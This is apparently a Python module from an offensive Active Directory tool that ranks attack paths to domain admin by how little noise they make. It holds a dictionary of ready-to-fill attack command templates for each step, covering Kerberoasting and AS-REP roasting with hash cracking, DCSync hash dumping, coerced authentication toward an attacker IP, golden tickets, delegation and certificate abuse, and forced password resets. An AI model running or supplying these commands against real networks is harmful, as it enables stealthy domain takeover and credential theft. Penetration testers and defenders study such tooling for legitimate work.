"""
pathfinder.py — Dijkstra-based attack path discovery.

Finds paths from any node to high-value targets (Domain Admins, DCs, krbtgt)
weighted by OPSEC noise score. Lower cost = quieter path = preferred.

AraizCorp LLC — Serket
"""
from __future__ import annotations

from typing import Optional
import networkx as nx

from serket.graph.builder import ADGraph


# ── High-value target detection ───────────────────────────────────────────────

_HIGH_RID_NAMES = {
    "Domain Admins", "Enterprise Admins", "Schema Admins",
    "Administrators", "Domain Controllers", "krbtgt",
}


def _resolve_high_value_nodes(ag: ADGraph) -> set[str]:
    """Return SIDs/IDs of nodes that represent full domain compromise."""
    hvn: set[str] = set(ag.high_value)

    for sid, data in ag.G.nodes(data=True):
        name = data.get("name", "")
        if (
            name.lower() == "krbtgt" or
            data.get("is_dc") is True or
            name in _HIGH_RID_NAMES
        ):
            hvn.add(sid)

    # CertTemplate ESC1 nodes are indirect domain compromise vectors
    for sid, data in ag.G.nodes(data=True):
        if data.get("type") == "CertTemplate" and data.get("esc1"):
            hvn.add(sid)

    return hvn


# ── Suggested commands per edge type ─────────────────────────────────────────
# Placeholders: {domain}, {dc_ip}, {user}, {password}, {target}, {target_spn}

SUGGESTED_COMMANDS: dict[str, list[str]] = {
    "Kerberoastable": [
        "# Request TGS tickets for all Kerberoastable accounts",
        "GetUserSPNs.py '{domain}/{user}:{password}' -dc-ip {dc_ip} -request -outputfile kerberoast.txt",
        "",
        "# Crack offline (hashcat -m 13100 for Kerberos 5 TGS RC4)",
        "hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force",
    ],
    "ASREPRoastable": [
        "# Request AS-REP without pre-authentication",
        "GetNPUsers.py '{domain}/{target}' -dc-ip {dc_ip} -no-pass -format hashcat -outputfile asrep.txt",
        "",
        "# Crack offline (hashcat -m 18200 for Kerberos 5 AS-REP etype 23)",
        "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force",
    ],
    "DCSync": [
        "# Dump all domain hashes via MS-DRSR replication protocol",
        "secretsdump.py '{domain}/{user}:{password}'@{dc_ip} -just-dc-ntlm",
        "",
        "# Or dump all data (NTLM + Kerberos keys + LSA secrets)",
        "secretsdump.py '{domain}/{user}:{password}'@{dc_ip} -just-dc",
    ],
    "UnconstrainedDelegation": [
        "# Force DC to authenticate to this host (printer spooler abuse)",
        "printerbug.py '{domain}/{user}:{password}'@{target} {attacker_ip}",
        "",
        "# Or use PetitPotam (no credentials needed if NTLM is enabled)",
        "PetitPotam.py -u '{user}' -p '{password}' -d '{domain}' {attacker_ip} {target}",
        "",
        "# Dump captured TGT from memory (run on compromised host)",
        "mimikatz.exe \"sekurlsa::tickets /export\" exit",
        "ticketer.py -nthash {krbtgt_hash} -domain-sid {domain_sid} -domain {domain} administrator",
    ],
    "ConstrainedDelegation": [
        "# S4U2Self + S4U2Proxy to impersonate administrator",
        "getST.py -spn {target_spn} -impersonate administrator '{domain}/{user}:{password}' -dc-ip {dc_ip}",
        "export KRB5CCNAME=administrator.ccache",
        "wmiexec.py -k -no-pass '{domain}/administrator'@{target}",
    ],
    "RBCD": [
        "# Write msDS-AllowedToActOnBehalfOfOtherIdentity on target (requires GenericWrite/WriteDACL)",
        "impacket-rbcd -delegate-from '{user}$' -delegate-to '{target}$' -dc-ip {dc_ip} '{domain}/{user}:{password}' -action write",
        "",
        "# Get service ticket impersonating administrator",
        "getST.py -spn host/{target} -impersonate administrator '{domain}/{user}$:{password}' -dc-ip {dc_ip}",
        "export KRB5CCNAME=administrator.ccache",
        "secretsdump.py -k -no-pass '{domain}/administrator'@{target} -dc-ip {dc_ip}",
    ],
    "GenericAll": [
        "# Option 1: Reset target password",
        "net rpc password '{target}' 'NewP@ssw0rd123!' -U '{domain}/{user}%{password}' -S {dc_ip}",
        "",
        "# Option 2: Add user to group (if target is a group)",
        "bloodyAD --host {dc_ip} -d '{domain}' -u '{user}' -p '{password}' add groupMember '{target}' '{user}'",
        "",
        "# Option 3: Shadow Credentials (certificate-based persistence)",
        "pywhisker.py -a add -t '{target}' -u '{user}' -p '{password}' -d '{domain}' --dc-ip {dc_ip}",
    ],
    "WriteDACL": [
        "# Grant yourself FullControl on the target object",
        "dacledit.py -action write -rights FullControl -principal '{user}' -target '{target}' '{domain}/{user}:{password}' -dc-ip {dc_ip}",
        "",
        "# Then perform any desired action (e.g. DCSync if target is domain root)",
        "secretsdump.py '{domain}/{user}:{password}'@{dc_ip} -just-dc-ntlm",
    ],
    "WriteOwner": [
        "# Take ownership of the target object",
        "owneredit.py -action write -new-owner '{user}' -target '{target}' '{domain}/{user}:{password}' -dc-ip {dc_ip}",
        "",
        "# Then grant yourself FullControl via DACL modification",
        "dacledit.py -action write -rights FullControl -principal '{user}' -target '{target}' '{domain}/{user}:{password}' -dc-ip {dc_ip}",
    ],
    "ForceChangePassword": [
        "# Reset target account password (no knowledge of current password needed)",
        "net rpc password '{target}' 'NewP@ssw0rd123!' -U '{domain}/{user}%{password}' -S {dc_ip}",
        "",
        "# Alternative (Python)",
        "changepasswd.py '{domain}/{user}:{password}'@{dc_ip} -altuser '{target}' -newpass 'NewP@ssw0rd123!'",
    ],
    "AddMember": [
        "# Add controlled account to the target group",
        "net rpc group addmem '{target}' '{user}' -U '{domain}/{user}%{password}' -S {dc_ip}",
        "",
        "# Alternative",
        "bloodyAD --host {dc_ip} -d '{domain}' -u '{user}' -p '{password}' add groupMember '{target}' '{user}'",
    ],
    "AddSelf": [
        "# Add yourself to the target group (validated write: AddSelf)",
        "bloodyAD --host {dc_ip} -d '{domain}' -u '{user}' -p '{password}' add groupMember '{target}' '{user}'",
    ],
    "ShadowCredentials": [
        "# Add a Key Credential to the target account (PKINIT-based auth)",
        "pywhisker.py -a add -t '{target}' -u '{user}' -p '{password}' -d '{domain}' --dc-ip {dc_ip}",
        "",
        "# Use the generated PFX to get a TGT",
        "gettgtpkinit.py '{domain}/{target}' -cert-pfx '{target}.pfx' -pfx-pass <pfx_pass> '{target}.ccache'",
        "export KRB5CCNAME={target}.ccache",
        "secretsdump.py -k -no-pass '{domain}/{target}'@{dc_ip}",
    ],
    "ADCS_ESC1": [
        "# Request a certificate as any user (SAN abuse)",
        "certipy req -u '{user}@{domain}' -p '{password}' -ca '{ca_name}' -template '{target}' -upn 'administrator@{domain}' -dc-ip {dc_ip}",
        "",
        "# Authenticate with the certificate and retrieve NT hash",
        "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}",
        "",
        "# Or use for PTH",
        "secretsdump.py '{domain}/administrator'@{dc_ip} -hashes :<nt_hash>",
    ],
    "HasSIDHistory": [
        "# Account's token includes historical SID — grants access automatically.",
        "# Use this account normally; the SID history is evaluated by AD.",
        "# Verify effective access:",
        "Get-ADUser -Identity '{target}' -Properties SIDHistory | Select SIDHistory",
    ],
    "HasPasswordInDescription": [
        "# Check the description attribute of this account for embedded credentials.",
        "# In LDAP:",
        "ldapsearch -H ldap://{dc_ip} -D '{user}@{domain}' -w '{password}' -b '{target_dn}' description",
        "",
        "# Then test extracted credential against other accounts (password reuse):",
        "crackmapexec smb {dc_ip} -u users.txt -p <found_password> --continue-on-success",
    ],
    "MemberOf": [
        "# Account is a member of this group — no action needed.",
        "# Leverage the group's permissions for subsequent steps in the path.",
    ],
    "AllExtendedRights": [
        "# AllExtendedRights includes ForceChangePassword and DCSync (if on domain).",
        "# Force password reset:",
        "net rpc password '{target}' 'NewP@ssw0rd123!' -U '{domain}/{user}%{password}' -S {dc_ip}",
        "",
        "# If on domain object — DCSync:",
        "secretsdump.py '{domain}/{user}:{password}'@{dc_ip} -just-dc-ntlm",
    ],
    "GenericWrite": [
        "# Write to the target's attributes (e.g. set SPN for Kerberoasting, or Shadow Creds)",
        "# Add an SPN to enable Kerberoasting:",
        "bloodyAD --host {dc_ip} -d '{domain}' -u '{user}' -p '{password}' set object '{target}' servicePrincipalName --value 'fake/spn'",
        "GetUserSPNs.py '{domain}/{user}:{password}' -dc-ip {dc_ip} -request -outputfile kerberoast.txt",
    ],
}


# ── OPSEC-weighted path cost ──────────────────────────────────────────────────

def _path_cost(G: nx.DiGraph, path: list[str]) -> int:
    cost = 0
    for i in range(len(path) - 1):
        edges = G.get_edge_data(path[i], path[i + 1]) or {}
        cost += edges.get("opsec_score", 5)
    return cost


# ── Path annotation ───────────────────────────────────────────────────────────

def _describe_path(G: nx.DiGraph, path: list[str]) -> list[dict]:
    """Return a list of step dicts for display and web UI."""
    steps = []
    for i in range(len(path) - 1):
        src, tgt = path[i], path[i + 1]
        edge_data = G.get_edge_data(src, tgt) or {}
        src_data  = G.nodes.get(src, {})
        tgt_data  = G.nodes.get(tgt, {})
        etype     = edge_data.get("type", "?")

        steps.append({
            "src":        src,
            "src_name":   src_data.get("name", src),
            "src_type":   src_data.get("type", "?"),
            "tgt":        tgt,
            "tgt_name":   tgt_data.get("name", tgt),
            "tgt_type":   tgt_data.get("type", "?"),
            "edge_type":  etype,
            "noise":      edge_data.get("noise", "?"),
            "opsec":      edge_data.get("opsec_score", 5),
            "mitre":      edge_data.get("mitre"),
            "detail":     edge_data.get("detail", ""),
            "commands":   SUGGESTED_COMMANDS.get(etype, []),
        })
    return steps


# ── Attack surface ────────────────────────────────────────────────────────────

def get_attack_surface(ag: ADGraph, ad_data: dict) -> dict:
    """
    Summarize the domain attack surface without computing paths.
    Returns counts and lists for each attack category.
    """
    G = ag.G
    surface: dict = {
        "kerberoastable":        [],
        "asreproastable":        [],
        "unconstrained":         [],
        "constrained":           [],
        "rbcd":                  [],
        "dcsync":                [],
        "acl_abuse":             [],
        "adcs_esc1":             [],
        "sid_history":           [],
        "password_in_desc":      [],
        "laps_readable":         [],
        "gmsa_accounts":         [],
        "trusts":                ad_data.get("trusts", []),
        "domain_maq":            ad_data.get("domain", {}).get("maq", 10),
        "lockout_threshold":     ad_data.get("domain", {}).get("lockout_threshold", 0),
    }

    for src, tgt, data in G.edges(data=True):
        etype = data.get("type", "")
        src_d = G.nodes.get(src, {})
        tgt_d = G.nodes.get(tgt, {})

        if etype == "Kerberoastable":
            surface["kerberoastable"].append({
                "sid": src, "name": src_d.get("name", src),
                "spns": src_d.get("spns", []),
                "admin_count": src_d.get("admin_count", 0),
            })
        elif etype == "ASREPRoastable":
            surface["asreproastable"].append({
                "sid": src, "name": src_d.get("name", src),
            })
        elif etype == "UnconstrainedDelegation":
            surface["unconstrained"].append({
                "sid": src, "name": src_d.get("name", src),
                "type": src_d.get("type", "?"),
                "is_dc": src_d.get("is_dc", False),
            })
        elif etype == "DCSync":
            surface["dcsync"].append({
                "sid": src, "name": src_d.get("name", src),
                "target": tgt_d.get("name", tgt),
            })
        elif etype in ("GenericAll", "WriteDACL", "WriteOwner",
                       "AllExtendedRights", "ForceChangePassword",
                       "AddMember", "ShadowCredentials", "GenericWrite"):
            surface["acl_abuse"].append({
                "sid": src, "name": src_d.get("name", src),
                "target_sid": tgt, "target_name": tgt_d.get("name", tgt),
                "edge": etype,
                "target_high_value": tgt_d.get("high_value", False),
            })
        elif etype == "ADCS_ESC1":
            surface["adcs_esc1"].append({
                "enroller": src_d.get("name", src),
                "template":  tgt_d.get("name", tgt),
            })
        elif etype == "RBCD":
            surface["rbcd"].append({
                "trustee": src_d.get("name", src),
                "target":  tgt_d.get("name", tgt),
            })
        elif etype == "HasSIDHistory":
            surface["sid_history"].append({
                "account":  src_d.get("name", src),
                "mimics":   tgt_d.get("name", tgt),
                "high_val": tgt_d.get("high_value", False),
            })
        elif etype == "HasPasswordInDescription":
            surface["password_in_desc"].append({
                "sid": src, "name": src_d.get("name", src),
            })

    # LAPS and gMSA are node attributes, not edges — collect from nodes
    for sid, data in G.nodes(data=True):
        if data.get("laps_readable"):
            surface["laps_readable"].append({
                "sid": sid, "name": data.get("name", sid),
                "dns": data.get("dns", ""),
            })
        if data.get("is_gmsa"):
            surface["gmsa_accounts"].append({
                "sid": sid,
                "name": data.get("name", sid),
                "password_readable": data.get("gmsa_password_readable", False),
            })

    # De-duplicate and sort ACL abuses — high-value targets first
    surface["acl_abuse"] = [
        dict(t) for t in {frozenset(d.items()) for d in surface["acl_abuse"]}
    ]
    surface["acl_abuse"].sort(key=lambda x: (not x["target_high_value"], x["edge"]))

    return surface


# ── Main path finder ──────────────────────────────────────────────────────────

class Pathfinder:

    @staticmethod
    def find_all(ag: ADGraph, ad_data: dict, max_paths: int = 20) -> dict:
        """
        Find attack paths to domain compromise using Dijkstra (opsec_score weight).

        Unlike BFS with a fixed hop cutoff, Dijkstra finds the quietest paths
        regardless of depth. Self-loops (Kerberoastable, ASREPRoastable) are
        excluded from path-finding to avoid trivial one-hop results.

        Returns:
          {
            'high_value': list of target SIDs,
            'paths':      list of path dicts (src → steps → cost),
            'surface':    attack surface summary,
          }
        """
        G      = ag.G
        hvn    = _resolve_high_value_nodes(ag)
        paths  = []
        seen   = set()   # (src, tgt) pairs already added

        # Reverse graph once: Dijkstra from each HV target in G_rev gives all
        # paths TO that target in the original graph efficiently.
        G_rev = G.reverse(copy=False)

        for target_sid in hvn:
            if not G_rev.has_node(target_sid):
                continue
            try:
                # single_source_dijkstra returns (distances, path_dicts)
                # Each path in G_rev goes: target → ... → src
                # Reversing gives the attack path: src → ... → target
                _lengths, paths_rev = nx.single_source_dijkstra(
                    G_rev, target_sid, weight="opsec_score"
                )
            except Exception:
                continue

            for src_sid, path_rev in paths_rev.items():
                if src_sid == target_sid:
                    continue
                if G.nodes.get(src_sid, {}).get("high_value"):
                    continue  # skip HV→HV paths

                key = (src_sid, target_sid)
                if key in seen:
                    continue
                seen.add(key)

                path_nodes = list(reversed(path_rev))  # src → ... → target

                # Skip degenerate paths (self-loops from Kerberoastable, etc.)
                if len(path_nodes) < 2:
                    continue
                if len(path_nodes) == 2 and path_nodes[0] == path_nodes[1]:
                    continue

                cost  = _path_cost(G, path_nodes)
                steps = _describe_path(G, path_nodes)
                src_d = G.nodes.get(src_sid, {})

                paths.append({
                    "src":         src_sid,
                    "src_name":    src_d.get("name", src_sid),
                    "src_type":    src_d.get("type", "?"),
                    "target":      target_sid,
                    "target_name": ag.node_name(target_sid),
                    "hops":        len(path_nodes) - 1,
                    "cost":        cost,
                    "steps":       steps,
                    "noise":       max((s["opsec"] for s in steps), default=0),
                })

        # Sort: lowest cost first (quietest path), then fewer hops
        paths.sort(key=lambda p: (p["cost"], p["hops"]))
        paths = paths[:max_paths]

        return {
            "high_value": list(hvn),
            "paths":      paths,
            "surface":    get_attack_surface(ag, ad_data),
        }
